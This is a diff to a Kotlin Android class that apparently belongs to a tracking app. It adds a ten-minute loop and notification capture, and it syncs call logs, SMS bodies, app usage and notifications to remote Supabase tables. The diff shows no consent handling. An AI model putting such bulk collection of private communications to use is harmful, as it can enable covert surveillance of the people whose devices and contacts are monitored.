@@ -10,9 +10,11 @@ import android.provider.Telephony
 import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.asStateFlow
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import kotlinx.coroutines.withTimeout
@@ -24,6 +26,7 @@ import java.text.SimpleDateFormat
 import java.util.Calendar
 import java.util.Date
 import java.util.Locale
+import kotlin.time.Duration.Companion.minutes
 
 object LocationRepository {
     private var settingsManager: SettingsManager? = null
@@ -39,8 +42,9 @@ object LocationRepository {
     val isTracking = _isTracking.asStateFlow()
 
     private val repositoryScope = CoroutineScope(Dispatchers.IO)
+    private var periodicSyncJob: Job? = null
 
-    private fun getSdf() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+    fun getSdf() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
 
     fun init(context: Context) {
         settingsManager = SettingsManager(context)
@@ -49,25 +53,44 @@ object LocationRepository {
         updateDeviceName(context)
         updateClient()
         refreshLocalRecords()
+        
+        // 初始同步
         triggerAllSync(context)
+        
+        // 开启定时同步（每 10 分钟一次）
+        startPeriodicSync(context)
     }
 
-    private fun triggerAllSync(context: Context) {
+    // 暴露给外部，用于手动触发（如从设置返回或回到主页）
+    fun triggerAllSync(context: Context) {
         repositoryScope.launch {
+            Log.d("LocationRepository", "Triggering full sync scan...")
             scanAndSaveAppInfo(context)
             scanAndSaveAppSessions(context)
             scanAndSaveCallLogs(context)
             scanAndSaveSms(context)
             
             syncLocationsInBatches()
-            delay(2000)
+            delay(1000)
             syncAppInfosInBatches()
-            delay(2000)
+            delay(1000)
             syncSessionsInBatches()
-            delay(2000)
+            delay(1000)
             syncCallsInBatches()
-            delay(2000)
+            delay(1000)
             syncSmsInBatches()
+            delay(1000)
+            syncNotificationsInBatches()
+        }
+    }
+
+    private fun startPeriodicSync(context: Context) {
+        periodicSyncJob?.cancel()
+        periodicSyncJob = repositoryScope.launch {
+            while (isActive) {
+                delay(10.minutes)
+                triggerAllSync(context)
+            }
         }
     }
 
@@ -85,6 +108,9 @@ object LocationRepository {
         } catch (e: Exception) { null }
         currentDeviceName = bluetoothName ?: "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"      
     }
+
+    fun getDeviceId() = currentDeviceId
+    fun getDeviceName() = currentDeviceName
 
     private fun refreshLocalRecords() {
         repositoryScope.launch {
@@ -111,15 +137,9 @@ object LocationRepository {
             try {
                 val pm = context.packageManager
                 val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
-                
-                // 核心改进：将起始时间设为 0，以获取系统记录的所有历史累计数据
-                val startTime = 0L 
-                val endTime = System.currentTimeMillis()
-
-                val statsMap = usageStatsManager.queryAndAggregateUsageStats(startTime, endTime)
+                val statsMap = usageStatsManager.queryAndAggregateUsageStats(0L, System.currentTimeMillis())
                 val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                 val sdf = getSdf()
-                
                 apps.forEach { appInfo ->
                     val packageName = appInfo.packageName
                     val installTime = try { sdf.format(Date(pm.getPackageInfo(packageName, 0).firstInstallTime)) } catch (e: Exception) { "Unknown" }
@@ -134,7 +154,6 @@ object LocationRepository {
                         deviceName = currentDeviceName
                     ))
                 }
-                Log.d("LocationRepository", "Lifetime AppInfo scan completed.")
             } catch (e: Exception) { Log.e("LocationRepository", "AppInfo scan failed") }
         }
     }
@@ -153,9 +172,8 @@ object LocationRepository {
                     val event = UsageEvents.Event()
                     events.getNextEvent(event)
                     val pkg = event.packageName
-                    if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
-                        openTimeMap[pkg] = event.timeStamp
-                    } else if (event.eventType == UsageEvents.Event.MOVE_TO_BACKGROUND) {
+                    if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) openTimeMap[pkg] = event.timeStamp
+                    else if (event.eventType == UsageEvents.Event.MOVE_TO_BACKGROUND) {
                         openTimeMap[pkg]?.let { start ->
                             val duration = event.timeStamp - start
                             if (duration > 1000) {
@@ -226,6 +244,14 @@ object LocationRepository {
         }
     }
 
+    // 保存通知并立即触发同步
+    fun saveNotification(record: NotificationRecord) {
+        repositoryScope.launch {
+            dbHelper?.insertNotification(record)
+            syncNotificationsInBatches() // 立即同步通知，确保及时性
+        }
+    }
+
     private suspend fun syncLocationsInBatches() {
         val client = supabaseClient ?: return
         val settings = settingsManager ?: return
@@ -245,8 +271,6 @@ object LocationRepository {
         val client = supabaseClient ?: return
         val unsynced = dbHelper?.getUnsyncedAppInfos() ?: return
         if (unsynced.isEmpty()) return
-        
-        Log.i("LocationRepository", "Batch syncing ${unsynced.size} app infos (Prioritizing active apps)...")
         unsynced.chunked(50).forEach { batch ->
             try {
                 withTimeout(60000) { client.postgrest.from("app_info_stats").upsert(batch) { onConflict = "device_id,package_name" } }
@@ -260,8 +284,6 @@ object LocationRepository {
         val client = supabaseClient ?: return
         val unsynced = dbHelper?.getUnsyncedSessions() ?: return
         if (unsynced.isEmpty()) return
-
-        Log.i("LocationRepository", "Batch syncing ${unsynced.size} sessions...")
         unsynced.chunked(50).forEach { batch ->
             try {
                 withTimeout(60000) { client.postgrest.from("app_session_history").insert(batch) }
@@ -275,8 +297,6 @@ object LocationRepository {
         val client = supabaseClient ?: return
         val unsynced = dbHelper?.getUnsyncedCalls() ?: return
         if (unsynced.isEmpty()) return
-
-        Log.i("LocationRepository", "Batch syncing ${unsynced.size} calls...")
         unsynced.chunked(50).forEach { batch ->
             try {
                 withTimeout(60000) { client.postgrest.from("call_history").upsert(batch) { onConflict = "device_id,number,time" } }
@@ -290,14 +310,25 @@ object LocationRepository {
         val client = supabaseClient ?: return
         val unsynced = dbHelper?.getUnsyncedSms() ?: return
         if (unsynced.isEmpty()) return
-
-        Log.i("LocationRepository", "Batch syncing ${unsynced.size} sms records...")
         unsynced.chunked(50).forEach { batch ->
             try {
                 withTimeout(60000) { client.postgrest.from("sms_history").upsert(batch) { onConflict = "device_id,address,body,time" } }
                 batch.forEach { dbHelper?.markSmsSynced(it.id) }
                 delay(300)
             } catch (e: Exception) { Log.e("LocationRepository", "Batch sms sync failed") }
+        }
+    }
+
+    private suspend fun syncNotificationsInBatches() {
+        val client = supabaseClient ?: return
+        val unsynced = dbHelper?.getUnsyncedNotifications() ?: return
+        if (unsynced.isEmpty()) return
+        unsynced.chunked(50).forEach { batch ->
+            try {
+                withTimeout(60000) { client.postgrest.from("notification_history").insert(batch) }
+                batch.forEach { dbHelper?.markNotificationSynced(it.id) }
+                delay(200)
+            } catch (e: Exception) { Log.e("LocationRepository", "Batch notification sync failed") }
         }
     }
 
